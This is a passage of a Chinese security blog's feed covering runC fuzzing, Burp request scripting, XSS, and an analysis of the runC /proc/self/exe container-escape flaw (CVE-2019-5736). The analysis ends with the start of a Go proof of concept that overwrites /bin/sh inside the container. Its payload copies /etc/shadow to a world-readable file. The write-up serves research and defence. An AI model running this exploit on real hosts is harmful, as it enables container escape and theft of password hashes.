alt="img"></p><p>这一段的主要作用就是在添加监听器前判断其类型是否时<code>message</code>，如果是则记录下来一些数据，比如此时的堆栈信息等。合理推测<code>Burp</code>在此之上加入了危险函数判断的操作，后续有空的话就给<code>DOM Invader</code>加一个类似的功能练练手吧，日常使用当然还是<code>Burp</code>的香啊~</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><p><a href="https://github.com/fransr/postMessage-tracker">https://github.com/fransr/postMessage-tracker</a></p></li><li><p><a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader">https://portswigger.net/burp/documentation/desktop/tools/dom-invader</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;EventListener XSS&lt;/strong&gt;&lt;br&gt;XSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是&lt;code&gt;DOM&lt;/code&gt;型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听&lt;code&gt;postMessag</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="XSS" scheme="https://rainsec.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>runC-fuzz</title>
    <link href="https://rainsec.cn/post/RunC-Fuzz.html"/>
    <id>https://rainsec.cn/post/RunC-Fuzz.html</id>
    <published>2022-03-11T10:48:45.000Z</published>
    <updated>2022-07-22T11:57:48.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="runC-fuzz"><a href="#runC-fuzz" class="headerlink" title="runC-fuzz"></a>runC-fuzz</h1><p>​本文主要是根据AdaLogics开源的<a href="https://github.com/AdaLogics/runc-fuzzers">runc-fuzzers</a>和自己之前做的一些fuzz，研究一下可能的问题和相关的解决方案。在此之前可能会有朋友对runc比较陌生，可以参考一下之前的文章：<a href="https://bbs.pediy.com/thread-271130.htm">https://bbs.pediy.com/thread-271130.htm</a></p><h2 id="AdaLogics如何fuzz"><a href="#AdaLogics如何fuzz" class="headerlink" title="AdaLogics如何fuzz"></a>AdaLogics如何fuzz</h2><p>​runC是go语言编写的，那么对于fuzz引擎的选择毫无疑问应该是go-fuzz，纵观runC的项目结构，其实就是包裹了libcontainer，这也不难理解，因为在我的印象里面runC项目本身就是为了符合OCI标准拆分出来的。</p><p>​如果是fuzz的话，go语言里面最经常出现的问题其实就是索引超出边界，切片边界超出范围nil指针解引用等等，因此对于go-fuzz这种深入项目内部编写Fuzz函数的引擎，其实对于项目内部目标的选取十分关键。在AdaLogics的报告中指出runC具备较少的fuzz引擎入口点，因为现代模糊测试引擎其实更加适合解析，比如文本解析，编码解码或者各种其它API，但是这其实在runC里面比较少。</p><p>​首先分析AdaLogics是怎么做的，在思考了上述问题之后他们把目标放在了API和信息解析上面，相对于信息解析还好说，本身利用go-fuzz引擎生成的大量数据可以轻松实现fuzz，但是对于API来说，其输入内容还是相对结构化的，可以看看下面的例子：</p><pre><code class="go">// 抽取的runC代码片段func parseCgroupFromReader(r io.Reader) (string, error) {    s := bufio.NewScanner(r)    for s.Scan() {        var (            text  = s.Text()            parts = strings.SplitN(text, ":", 3)        )        if len(parts) &lt; 3 {            return "", fmt.Errorf("invalid cgroup entry: %q", text)        }        // text is like "0::/user.slice/user-1001.slice/session-1.scope"        if parts[0] == "0" &amp;&amp; parts[1] == "" {            return parts[2], nil        }    }    if err := s.Err(); err != nil {        return "", err    }    return "", errors.New("cgroup path not found")}</code></pre><p>这样的代码显然就比较适合利用go-fuzz引擎生成的测试用例直接跑fuzz，但是对于下面的例子：</p><pre><code class="go">func statPids(dirPath string, stats *cgroups.Stats) error {    current, err := fscommon.GetCgroupParamUint(dirPath, "pids.current")    if err != nil {        if os.IsNotExist(err) {            return statPidsFromCgroupProcs(dirPath, stats)        }        return err    }    max, err := fscommon.GetCgroupParamUint(dirPath, "pids.max")    if err != nil {        return err    }    // If no limit is set, read from pids.max returns "max", which is    // converted to MaxUint64 by GetCgroupParamUint. Historically, we    // represent "no limit" for pids as 0, thus this conversion.    if max == math.MaxUint64 {        max = 0    }    stats.PidsStats.Current = current    stats.PidsStats.Limit = max    return nil}</code></pre><p>这显然就是比较结构化的输入了，其实这种问题在面对其它语言的时候也有遇到，结构化Fuzz一直是Fuzz的难点之一，但是和go-fuzz项目，因为引擎和fuzz方式的不同其实在结构化上面也有很大的差异，比如一些C/C++项目，可能会用protobuf或者中间语言IR的方式来实现数据结构化，但是go-fuzz的话在对应的Fuzz函数内部引入这些功能无疑是比较麻烦。这里AdaLogics实现了<a href="https://github.com/AdaLogics/go-fuzz-headers">go-fuzz-headers</a>来帮助实现结构化。</p><p>​        从<code>statPids</code>就可以看出，在结构化的目标中大多都是相关结构体：</p><pre><code class="go">type Stats struct {    CpuStats    CpuStats    `json:"cpu_stats,omitempty"`    CPUSetStats CPUSetStats `json:"cpuset_stats,omitempty"`    MemoryStats MemoryStats `json:"memory_stats,omitempty"`    PidsStats   PidsStats   `json:"pids_stats,omitempty"`    BlkioStats  BlkioStats  `json:"blkio_stats,omitempty"`    // the map is in the format "size of hugepage: stats of the hugepage"    HugetlbStats map[string]HugetlbStats `json:"hugetlb_stats,omitempty"`    RdmaStats    RdmaStats               `json:"rdma_stats,omitempty"`}</code></pre><p>因此其实只需要吧go-fuzz根据种子数据生成的脏数据进行结构体类型转化就能实现这个目标，这也正是go-fuzz-headers所做的，当然实际要做的工作比这个目标要麻烦的多。</p><p>​        在实现了结构化之后接下来其实就比较简单了，选取目标进行Fuzz，AdaLogics对项目结构进行分析之后决定选取下面库作为目标：</p><ul><li>fs2</li><li>specconv</li><li>devices</li><li>fscommon</li><li>intelrdt</li><li>libcontainer</li><li>user</li><li>userns</li><li>configs</li></ul><p>总共建立了12个Fuzz，在库中选取符合文本解析，编码解码或者各种其它API这些目标的函数进行了Fuzz。</p><h2 id="我如何Fuzz"><a href="#我如何Fuzz" class="headerlink" title="我如何Fuzz"></a>我如何Fuzz</h2><p>​        其实在runc-fuzzers开源以前本人就开始思考如何对容器相关的目标进行fuzz，对比该开源项目其实在runc的fuzz上面我们撞了很多库和函数，因此对于这一部分就不多说了，本人做的不足的是没有实现类似go-fuzz-headers这样的辅助库来帮助生成更强大的语料库，而是通过裁剪目标函数来让目标更适合fuzz引擎，对比之下本人的语料库显然low了很多，但是这种裁剪也使得目标每一部分的代码更清晰明了，个人觉得还是有助于发现一些细节问题的，并且fuzz的速度也应该更快。</p><p>​        在对于目标的选取上，本人也更加“放肆”，因为因为容器的安全模型还不完善不必过于考虑引擎入口点的问题（也可能是我拆代码的原因）对apparmor这类的库也进行了Fuzz编写，但是问题在于合理的属于也可能带来灾难性的后果，详情可以参考之前分析的<a href="https://mp.weixin.qq.com/s?__biz=Mzg3NzczOTA3OQ==&amp;tempkey=MTE1MV9wVHdrYTBGZW8yVjVxOEFuNXFKRC1UNHJGMDE4clNTdG15Ni1NM05Va3dhQ2tGLVYwTFM3U3o3YjBRNlBFaW1CN08tdEFWR0NuOHAya2dFeFpJcElsTWpfS01ycXdSaHFKZ3dzNWM0WXJ3OWNiRjlLQU5yOTdreWRGREtmMGxqOWlVNjFKLTVubTlDd0pGVmt3ejF1YjNkZHdQVE84cVppclgzV0tBfn4=&amp;chksm=4f1f2e957868a783215742944470f7dbb2a5355bc3bc586c4e2b6adf667ea9bcff445928f0d6&amp;scene=0&amp;xtrack=1&amp;previewkey=Vic7j%252B%252BS0aUVSaKkG5ZwE8wqSljwj2bfCUaCyDofEow%253D#wechat_redirect">apparmor漏洞</a>，但是这些逻辑类型的漏洞很难通过fuzz来找到，希望大佬们有啥更好的办法可以提出吧。</p><h2 id="结果如何"><a href="#结果如何" class="headerlink" title="结果如何"></a>结果如何</h2><p>​        其实结果对于一个安全研究者来说是绝望的，可以看下AdaLogics发布的漏洞报告：</p><blockquote><p>The fuzzers found no bug during the assessment, which is a great achievement to the RunC and Umoci authors. However, we acknowledge that there is a reasonable expectation that bugs will occur once the pending pull requests are merged in. We go into details with this in the next section.</p></blockquote><p>本人自己的Fuzz在跑了2天之后也是no bug found，这也说明或许对于这些go项目来说，它们一边自身不断的集成Fuzz：比如runC的fuzz pr，或者是argo的fuzz项目都开始利用oss-fuzz将fuzz演变为常态化的手段来不断测试新加入的项目代码，同时从报告里看出，fuzz也确实需要常态化：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/runcfuzz.png" alt="image-20220311110516312"></p><h2 id="未来展望"><a href="#未来展望" class="headerlink" title="未来展望"></a>未来展望</h2><p>​        一方面，这些其实只是对于runc项目进行了部分测试，就代码覆盖率而言其实完全不能算是达标，同时fuzz本身的运行时间过短其实不能算是一次合格的模糊测试，就长期来看Fuzz需要在CI tests中不断继承来确保软件的内生安全问题，通过持续不断的Fuzz运行也会不断的对新代码进行安全测试。</p><p>​        就长远来看AdaLogics提出了一种观点，在fuzz中产生容器同时在容器内运行大量不同进程来进行整体性的安全测试，但是就目前fuzz的成熟度而言，还远不能达到这种效果。</p><pre><code class="go">    err := container.Run(process) if err != nil {    container.Destroy()   logrus.Fatal(err)   return}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;runC-fuzz&quot;&gt;&lt;a href=&quot;#runC-fuzz&quot; class=&quot;headerlink&quot; title=&quot;runC-fuzz&quot;&gt;&lt;/a&gt;runC-fuzz&lt;/h1&gt;&lt;p&gt;​本文主要是根据AdaLogics开源的&lt;a href=&quot;https://githu</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="https://rainsec.cn/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="Fuzz" scheme="https://rainsec.cn/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>灵活的修改Burp请求</title>
    <link href="https://rainsec.cn/post/%E7%81%B5%E6%B4%BB%E7%9A%84%E4%BF%AE%E6%94%B9Burp%E8%AF%B7%E6%B1%82.html"/>
    <id>https://rainsec.cn/post/%E7%81%B5%E6%B4%BB%E7%9A%84%E4%BF%AE%E6%94%B9Burp%E8%AF%B7%E6%B1%82.html</id>
    <published>2022-03-05T10:38:45.000Z</published>
    <updated>2022-07-20T11:26:24.147Z</updated>
    
    <content type="html"><![CDATA[<h1 id="灵活的修改Burp请求"><a href="#灵活的修改Burp请求" class="headerlink" title="灵活的修改Burp请求"></a>灵活的修改Burp请求</h1><p>  在日常渗透测试中经常会遇到请求头需要替换、请求或响应内容需要解密等一系列麻烦的事。更换请求头可以通过<code>Burp</code>的<code>Match and Replace</code>功能来实现，加解密也有一些插件可以实现，但是它们普遍存在着以下缺陷：</p><ul><li><p>自定义数据不能进行保存</p></li><li><p>加解密不能灵活的指定位置</p></li></ul><p>  带着这些需求，笔者在寻找工具时发现了一款有趣的插件<code>Python Scripter: https://github.com/PortSwigger/python-scripter</code> </p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>  与其说这是一个插件，不如说其更像是一个框架。简单地说，它的功能是将当前请求上下文作为全局变量传入用户自定义的代码中，也就是说用户可以随意的修改请求信息。它本身的代码也是很简单的</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image1.4mg8n7lywo40.png" alt="img"></p><p>  首先是将请求信息传递给用户自定义脚本的集合中，然后每个脚本分别对请求信息进行处理</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image2.2hu9hc06lfi0.png" alt="img"></p><p>  这里的处理其实就是用户编译代码通过后，把操作<code>Burp</code>的接口作为全局变量传递进去并执行</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image3.3fssj0kye600.png" alt="img"></p><p>  这就实现了以插件“写”插件。</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image4.3vlf70bxkv80.png" alt="img"></p><h2 id="完善"><a href="#完善" class="headerlink" title="完善"></a>完善</h2><p>  上文的框架让我们有了灵活操纵请求的希望，而<code>https://github.com/lanmaster53/pyscripter-er/blob/master/pyscripterer.py</code> 则成功的将其变为了现实。其定义了一个接受<code>messageInfo</code>等请求信息的<code>Class</code>，并且提供了许多写好的方法以便于更新请求信息，例如删除一个请求头，可以这么写：</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image5.2blkgsq9j98g.png" alt="img"></p><p>  这样任何请求都将不存在<code>Sec-Ch-Ua-Mobile</code>这个字段，<code>remove_request_headers</code>就是<code>pyscripter-er</code>中定义好的一个方法，主要作用就是遍历移除指定<code>header_name</code>开头的<code>haeder</code>字段并重新构造请求包</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image6.2agpex1rcy3o.png" alt="img"></p><p>  如果要增加新的通用函数只需要在<code>pyscripterer</code>中进行修改即可，比如增加一个添加请求头的方法</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image7.37vfz4dftim0.png" alt="img"></p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>  接下来用实战来检验下，在测试某个网站时碰到了如下加密请求</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image8.1y7vruzai6cg.png" alt="img"></p><p>  通过分析<code>JS</code>发现其加密算法是<code>base64</code>加上一定的换位：</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image9.e84l9bc9ndc.png" alt="img"></p><p>  那我们的思路就是每次请求时找到<code>jsonparams</code>这个参数，并对其进行加密，这样在发送请求时我们看到的参数就是未加密的了，方便我们在<code>repeater</code>进行测试。首先创建一个函数用于获取参数，根据参数名遍历即可</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image10.6sygad9jx6k0.png" alt="img"></p><p>  删除找到的参数，之后重新创建一个新的参数，其值为加密后的值</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image11.76bg61giaqk0.png" alt="img"></p><p>  加密函数</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image12.4rljs094wni0.png" alt="img"></p><p>  结合起来调用</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image13.4yz7e159y7g0.png" alt="img"></p><p>  当我们发送请求</p><pre><code class="HTTP">jsonparams={"UserId":"1234"}</code></pre><p>  可以从<code>logger</code>中观测到其发生了变化，在<code>intruder</code>中的请求也会发生变化，再碰到需要爆破的场景时也是很实用的。</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image14.6jho2erfn2g0.png" alt="img"></p><p>  除了对请求处理之外，我们也可以对响应做处理，而且操作结果会直接在当前页面里显现出来，不会像请求一样需要在日志里查看其修改结果，可以很好的解决响应内容加密的问题。还拿上面的请求为例，其响应内容是未加密的，这里给它做一次加密，简单的对相应内容做一次替换：</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image15.4rxk8cilfuw0.png" alt="img"></p><p>  使用<code>base64</code>进行加密</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image16.3qx8u8ni4020.png" alt="img"></p><p>  最终的结果如下</p><p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image18.63sojynzc5s0.png" alt="img"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>  使用<code>python-scripter</code>可以灵活的写出适用于不同场景下的插件，同时可以将其保存为模板，方便之后遇到相似情况下的使用。本次虽然遇到的加密算法比较简单，但是以<code>python</code>执行<code>jS</code>的便捷，相信再复杂些的算法也能很快的实现。</p><p>  本文中修改过后的<code>pyscripterer</code>已上传至<code>github</code>: <a href="https://github.com/No4l/python-scripter/blob/main/pyscripterer.py">https://github.com/No4l/python-scripter/blob/main/pyscripterer.py</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;灵活的修改Burp请求&quot;&gt;&lt;a href=&quot;#灵活的修改Burp请求&quot; class=&quot;headerlink&quot; title=&quot;灵活的修改Burp请求&quot;&gt;&lt;/a&gt;灵活的修改Burp请求&lt;/h1&gt;&lt;p&gt;  在日常渗透测试中经常会遇到请求头需要替换、请求或响应内容需要解密</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="BurpSuite" scheme="https://rainsec.cn/tags/BurpSuite/"/>
    
  </entry>
  
  <entry>
    <title>容器进程切换漏洞</title>
    <link href="https://rainsec.cn/post/%E5%AE%B9%E5%99%A8%E8%BF%9B%E7%A8%8B%E5%88%87%E6%8D%A2%E6%BC%8F%E6%B4%9E.html"/>
    <id>https://rainsec.cn/post/%E5%AE%B9%E5%99%A8%E8%BF%9B%E7%A8%8B%E5%88%87%E6%8D%A2%E6%BC%8F%E6%B4%9E.html</id>
    <published>2022-02-13T10:48:45.000Z</published>
    <updated>2022-07-22T11:57:29.270Z</updated>
    
    <content type="html"><![CDATA[<h1 id="容器进程切换思考"><a href="#容器进程切换思考" class="headerlink" title="容器进程切换思考"></a>容器进程切换思考</h1><h2 id="前置技术"><a href="#前置技术" class="headerlink" title="前置技术"></a>前置技术</h2><h3 id="Magic-Link"><a href="#Magic-Link" class="headerlink" title="Magic Link"></a>Magic Link</h3><p>​        /proc/目录下存在很多的链接文件，但是在Linux 也存在一种特殊的链接文件，这种文件的大小为0，我们知道普通的链接文件的大小等于链接目标的文件路径长度，但是Magic Link的大小为0，它们在打开方式上面也存在差别，普通链接文件会解析出链接文件的路径然后进行打开操作，但是Magic LInk的话不会这样，它会调用内核专门的处理函数，然后返回目标文件的文件描述符。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-20220108111923899.6057om2d7p4.png" alt="image-20220108111923899"></p><h3 id="匿名文件"><a href="#匿名文件" class="headerlink" title="匿名文件"></a>匿名文件</h3><p>​        Linux <a href="https://stackoverflow.com/questions/21617539/what-exactly-are-anonymous-files">Anonymous Files</a>，也叫匿名文件，匿名文件和普通的文件十分类似，可以被定义，修改，写入，读取等等，但是和普通文件不同的是它并不是一个实体的文件，当用户使用memfd_create创建一个匿名文件的时候会返回一个文件描述符，一旦对这个文件描述符的所有引用都被丢弃的时候，该匿名文件就会被销毁，而且在该文件的整个生命周期中都是存在于内存的RAM当中，并不具备实体的文件。</p><h3 id="mount-namespace是如何实现的？"><a href="#mount-namespace是如何实现的？" class="headerlink" title="mount namespace是如何实现的？"></a>mount namespace是如何实现的？</h3><p>​        首先要了解在内核进程结构体<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L723">task_struct</a>里面存在一个nsproxy成员：</p><pre><code class="c">    struct task_struct {    .........    /* Namespaces: */    struct nsproxy            *nsproxy;    .......    }</code></pre><p>nsproxy结构体如下：</p><pre><code class="c">struct nsproxy {    atomic_t count;    struct uts_namespace *uts_ns;    struct ipc_namespace *ipc_ns;    struct mnt_namespace *mnt_ns;    struct pid_namespace *pid_ns_for_children;    struct net          *net_ns;    struct time_namespace *time_ns;    struct time_namespace *time_ns_for_children;    struct cgroup_namespace *cgroup_ns;};</code></pre><p>可以看到各种不同的namespace都有自己的相关结构体，但是本文着重介绍mount namespace相关实现，因此通过追踪内核中进程的创建过程发现mount namespace的实现如下：</p><p>内核函数调用链：</p><pre><code class="c">kernel_clone(_do_fork) -&gt; copy_process</code></pre><p>在<a href="https://elixir.bootlin.com/linux/latest/source/kernel/fork.c#L1930">copy_process</a>中发现大量和namespace相关的信息：</p><pre><code class="c">static __latent_entropy struct task_struct *copy_process(                    struct pid *pid,                    int trace,                    int node,                    struct kernel_clone_args *args){    int pidfd = -1, retval;    struct task_struct *p;    struct multiprocess_signals delayed;    struct file *pidfile = NULL;    u64 clone_flags = args-&gt;flags;    struct nsproxy *nsp = current-&gt;nsproxy;    /*     * Don't allow sharing the root directory with processes in a different     * namespace     */    if ((clone_flags &amp; (CLONE_NEWNS|CLONE_FS)) == (CLONE_NEWNS|CLONE_FS))        return ERR_PTR(-EINVAL);    if ((clone_flags &amp; (CLONE_NEWUSER|CLONE_FS)) == (CLONE_NEWUSER|CLONE_FS))        return ERR_PTR(-EINVAL);......}</code></pre><p>可以看到其实进程间的namespace可能具备某种继承关系，因此自然联想到系统0号进程，查阅相关资料发现存在init_task，它在内核刚启动的时候就进行了<a href="https://elixir.bootlin.com/linux/latest/source/init/main.c#L938">初始化</a>，而且在<a href="https://elixir.bootlin.com/linux/latest/source/init/init_task.c#L123">相关结构体</a>里面也确实找到了对于nsproxy的初始化：</p><pre><code class="c">......    .nsproxy    = &amp;init_nsproxy,......</code></pre><p>init_nsproxy的相关定义如下：</p><pre><code class="c">struct nsproxy init_nsproxy = {    .count            = ATOMIC_INIT(1),    .uts_ns            = &amp;init_uts_ns,#if defined(CONFIG_POSIX_MQUEUE) || defined(CONFIG_SYSVIPC)    .ipc_ns            = &amp;init_ipc_ns,#endif    .mnt_ns            = NULL,    .pid_ns_for_children    = &amp;init_pid_ns,#ifdef CONFIG_NET    .net_ns            = &amp;init_net,#endif#ifdef CONFIG_CGROUPS    .cgroup_ns        = &amp;init_cgroup_ns,#endif#ifdef CONFIG_TIME_NS    .time_ns        = &amp;init_time_ns,    .time_ns_for_children    = &amp;init_time_ns,#endif};</code></pre><p>可以发现，mnt_ns的相关初始化函数是NULL，因此mnt_ns并不继承父进程命名空间，回过头来看之前的copy_namespaces函数，发现其中存在<a href="https://elixir.bootlin.com/linux/latest/source/kernel/nsproxy.c#L67">create_new_namespaces</a>函数调用，在其中发现mnt_namespace确实是通过<a href="https://elixir.bootlin.com/linux/latest/source/fs/namespace.c#L3400">copy_mnt_ns</a>函数新创建的，至此我们已经大致了解了整个mnt_namespace的实现和创建流程。同时，通过copy_mnt_ns函数大致了解到，其实就是提供了独立的文件系统视图，设置各种挂载点，因此只要帮助绕过视图的影响就可以绕过mount namespace，所以符号链接攻击一直也是容器的痛点问题之一。</p><h3 id="runC-nsenter模块"><a href="#runC-nsenter模块" class="headerlink" title="runC nsenter模块"></a>runC nsenter模块</h3><p>​        在查看runC源码的时候发现nsenter模块，改模块的主要实现使用C语言写的，而且只在init.go的import中被引入，因此它的执行顺序是很靠前的。</p><pre><code class="go">package nsenter/*#cgo CFLAGS: -Wallextern void nsexec();void __attribute__((constructor)) init(void) {    nsexec();}*/import "C"</code></pre><p>在import “C”前面紧跟注释是cgo的一种特殊语法，注释里面包含的都是c语言的语法</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​        在容器中执行docker run或者docker exec的时候，最终结果都是runC驱动执行用户想要执行的命令。同时，分析runC源码发现，无论是runC run还是runC exec，一个比较核心的思想就是创建一个runner结构体，然后调用其实现的run()函数：</p><pre><code class="go">func execProcess(context *cli.Context) (int, error) {    container, err := getContainer(context)    if err != nil {        return -1, err    }    status, err := container.Status()    if err != nil {        return -1, err    }    if status == libcontainer.Stopped {        return -1, errors.New("cannot exec in a stopped container")    }    if status == libcontainer.Paused &amp;&amp; !context.Bool("ignore-paused") {        return -1, errors.New("cannot exec in a paused container (use --ignore-paused to override)")    }    path := context.String("process")    if path == "" &amp;&amp; len(context.Args()) == 1 {        return -1, errors.New("process args cannot be empty")    }    state, err := container.State()    if err != nil {        return -1, err    }    bundle := utils.SearchLabels(state.Config.Labels, "bundle")    p, err := getProcess(context, bundle)    if err != nil {        return -1, err    }    cgPaths, err := getSubCgroupPaths(context.StringSlice("cgroup"))    if err != nil {        return -1, err    }    r := &amp;runner{        enableSubreaper: false,        shouldDestroy:   false,        container:       container,        consoleSocket:   context.String("console-socket"),        detach:          context.Bool("detach"),        pidFile:         context.String("pid-file"),        action:          CT_ACT_RUN,        init:            false,        preserveFDs:     context.Int("preserve-fds"),        subCgroupPaths:  cgPaths,    }    return r.run(p)}</code></pre><p>不过在此之前都会通过loadFactory类来创建基础的libcontainer以便和容器进行交互，在exec.go中，getContainer的一个重要功能就是创建libccontainer实例：</p><pre><code class="go">// loadFactory returns the configured factory instance for execing containers.func loadFactory(context *cli.Context) (libcontainer.Factory, error) {    root := context.GlobalString("root")    abs, err := filepath.Abs(root)    if err != nil {        return nil, err    }    intelRdtManager := libcontainer.IntelRdtFs    // We resolve the paths for {newuidmap,newgidmap} from the context of runc,    // to avoid doing a path lookup in the nsexec context. TODO: The binary    // names are not currently configurable.    newuidmap, err := exec.LookPath("newuidmap")    if err != nil {        newuidmap = ""    }    newgidmap, err := exec.LookPath("newgidmap")    if err != nil {        newgidmap = ""    }    return libcontainer.New(abs, intelRdtManager,        libcontainer.CriuPath(context.GlobalString("criu")),        libcontainer.NewuidmapPath(newuidmap),        libcontainer.NewgidmapPath(newgidmap))}</code></pre><p>在结尾的New函数中，可以看到runC存储了一个MagicLink作为InitPath:</p><pre><code class="go">// New returns a linux based container factory based in the root directory and// configures the factory with the provided option funcs.func New(root string, options ...func(*LinuxFactory) error) (Factory, error) {    if root != "" {        if err := os.MkdirAll(root, 0o700); err != nil {            return nil, err        }    }    l := &amp;LinuxFactory{        Root:      root,        InitPath:  "/proc/self/exe",        InitArgs:  []string{os.Args[0], "init"},        Validator: validate.New(),        CriuPath:  "criu",    }    for _, opt := range options {        if opt == nil {            continue        }        if err := opt(l); err != nil {            return nil, err        }    }    return l, nil}</code></pre><p>在接下来的过程中会调用该InitPath，并且参数为init，相当于执行了runC init命令，在该命令中采用cgo的形式导入C语言nstnter进行命名空间的设置：</p><pre><code class="go">package mainimport (    "os"    "runtime"    "strconv"    "github.com/opencontainers/runc/libcontainer"    _ "github.com/opencontainers/runc/libcontainer/nsenter"    "github.com/sirupsen/logrus")......</code></pre><p>nsenter如下：</p><pre><code class="go">package nsenter/*#cgo CFLAGS: -Wallextern void nsexec();void __attribute__((constructor)) init(void) {    nsexec();}*/import "C"</code></pre><p>可以看到调用了nsexec()函数，该函数在go runtime之前进行调用，函数的主要作用就是解析之前父进程发送的netlink格式的配置信息，然后通过设置usernamespace并创建子进程，然后子进程设置其他一些namespace并通过创建孙进程使相关namespaces生效，这个孙进程其实就是容器中的init进程，不过回想这个过程，runC通过cmd.Start()开启一个子进程执行runC init，在runC init的nsenter包执行过程中，会首先设置自己的user namespace和pid namespace，这就使得在该过程中容器内本身存在的进程可以发现runC进程，因此：</p><pre><code class="c">void nsexec(void){    int pipenum;    jmp_buf env;    int syncpipe[2];    struct nlconfig_t config = {0};    /*     * If we don't have an init pipe, just return to the go routine.     * We'll only get an init pipe for start or exec.     */    pipenum = initpipe();    if (pipenum == -1)        return;    /* Parse all of the netlink configuration. */    nl_parse(pipenum, &amp;config);    /* clone(2) flags are mandatory. */    if (config.cloneflags == -1)        bail("missing clone_flags");    /* Pipe so we can tell the child when we've finished setting up. */    if (pipe(syncpipe) &lt; 0)        bail("failed to setup sync pipe between parent and child");    /* Set up the jump point. */    if (setjmp(env) == JUMP_VAL) {        /*         * We're inside the child now, having jumped from the         * start_child() code after forking in the parent.         */        uint8_t s = 0;        int consolefd = config.consolefd;        /* Close the writing side of pipe. */        close(syncpipe[1]);        /* Sync with parent. */        if (read(syncpipe[0], &amp;s, sizeof(s)) != sizeof(s) || s != SYNC_VAL)            bail("failed to read sync byte from parent");        if (setsid() &lt; 0)            bail("setsid failed");        if (setuid(0) &lt; 0)            bail("setuid failed");        if (setgid(0) &lt; 0)            bail("setgid failed");        if (setgroups(0, NULL) &lt; 0)            bail("setgroups failed");        if (consolefd != -1) {            if (ioctl(consolefd, TIOCSCTTY, 0) &lt; 0)                bail("ioctl TIOCSCTTY failed");            if (dup3(consolefd, STDIN_FILENO, 0) != STDIN_FILENO)                bail("failed to dup stdin");            if (dup3(consolefd, STDOUT_FILENO, 0) != STDOUT_FILENO)                bail("failed to dup stdout");            if (dup3(consolefd, STDERR_FILENO, 0) != STDERR_FILENO)                bail("failed to dup stderr");        }        /* Free netlink data. */        nl_free(&amp;config);        /* Finish executing, let the Go runtime take over. */        return;    }    /* Run the parent code. */    start_child(pipenum, &amp;env, syncpipe, &amp;config);    /* Should never be reached. */    bail("should never be reached");}</code></pre><p>​        如果，在runc启动之前，容器内部的进程可以通过/proc/目录观察到runc相关的进程，那么就可以通过/proc/runc-pid/exe获得runc具体的路径，这个exe文件是Magic Link文件，这就意味着这个文件的打开过程是调用内核里面专门的处理函数，不是想普通的链接文件那样找到目标链接文件打开，这其实就帮助我们绕过了mnt命名空间和chroot对容器中文件系统资源的限制。</p><p>​        如此我们就可以覆盖掉原本的runc二进制文件为我们的恶意代码，那么当用于下一次执行docker exec或者docker run之类需要调用runc的命令的时候就有可能会调用我们写入的恶意文件从而实现宿主机上面的恶意代码执行从而实现容器逃逸。</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code class="go">package main// Implementation of CVE-2019-5736// Created with help from @singe, @_cablethief, and @feexd.// This commit also helped a ton to understand the vuln// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9dimport (        "fmt"        "io/ioutil"        "os"        "strconv"        "strings")// This is the line of shell commands that will execute on the hostvar payload = "#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow"func main() {        // First we overwrite /bin/sh with the /proc/self/exe interpreter path        fd, err := os.Create("/bin/sh")        if err != nil {                fmt.Println(err)                return        }        fmt.Fprintln(fd, "#!/proc/self/exe")        err = fd.Close()        if err != nil {                fmt.Println(err)                return        }        